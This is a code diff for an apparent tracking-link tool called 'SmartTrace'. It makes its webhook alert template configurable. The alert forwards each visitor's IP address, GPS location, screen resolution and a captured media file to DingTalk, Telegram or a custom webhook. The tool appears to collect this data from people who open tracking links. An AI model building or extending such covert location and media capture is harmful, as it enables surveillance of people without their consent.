@@ -14,14 +14,23 @@ export async function sendWebhookNotification(data: {
   const setting = await getSmtpSetting(data.userId);
   if (!setting || !setting.webhookUrl) return;
 
-  const { webhookUrl, webhookType } = setting;
-  const text = `🚨 [SmartTrace 访客提醒]
-- 追踪编号: ${data.linkId}
-- IP 地址: ${data.ip}
-- GPS 定位: ${data.gps}
-- 屏幕分辨率: ${data.resolution}
-- 捕获时间: ${new Date(data.createdAt).toLocaleString()}
-- 媒体文件: ${data.filePath}`;
+  const { webhookUrl, webhookType, webhookTemplate } = setting;
+  
+  let text = webhookTemplate || `🚨 [SmartTrace 访客提醒]
+- 追踪编号: {linkId}
+- IP 地址: {ip}
+- GPS 定位: {gps}
+- 屏幕分辨率: {resolution}
+- 捕获时间: {createdAt}
+- 媒体文件: {filePath}`;
+
+  text = text
+    .replace(/{linkId}/g, data.linkId)
+    .replace(/{ip}/g, data.ip)
+    .replace(/{gps}/g, data.gps)
+    .replace(/{resolution}/g, data.resolution)
+    .replace(/{createdAt}/g, new Date(data.createdAt).toLocaleString())
+    .replace(/{filePath}/g, data.filePath);
 
   try {
     if (webhookType === "dingtalk") {
@@ -35,8 +44,6 @@ export async function sendWebhookNotification(data: {
         text: { content: text },
       }, { timeout: 5000 });
     } else if (webhookType === "telegram") {
-      // 适配 Telegram Bot API: https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>
-      // 允许用户直接输入完整的 Telegram Bot API URL 或自定义 Webhook
       const targetUrl = webhookUrl.includes("?") ? `${webhookUrl}&text=${encodeURIComponent(text)}` : `${webhookUrl}?text=${encodeURIComponent(text)}`;
       await axios.get(targetUrl, { timeout: 5000 });
     } else {
